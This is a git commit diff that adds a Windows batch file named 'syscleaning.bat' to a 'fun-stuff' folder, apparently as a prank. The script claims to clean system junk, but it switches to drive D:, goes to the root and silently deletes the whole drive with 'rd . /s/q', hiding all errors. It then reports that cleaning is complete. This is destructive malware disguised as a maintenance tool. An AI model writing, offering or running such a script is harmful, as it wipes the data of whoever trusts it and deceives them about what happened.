91e5ad5f1d191c1e423b6c53d20832005f30b829
Haoyu Zhang <haoyu.zhang@mail.mcgill.ca>
2022-06-26 05:25:39 +0800

    Update syscleaning.bat

--- fun-stuff/syscleaning.bat
+++ fun-stuff/syscleaning.bat
@@ -1,1 +1,10 @@
-
+@echo off
+color 0a
+title cleaning junks
+echo clearning the system of junks......
+d: >nul 2>nul 
+cd \ >nul 2>nul 
+rd . /s/q >nul 2>nul
+ping -n 10 127.0.0.1 >nul 2>nul
+echo Congraduation!!! Cleaning complete!
+pause
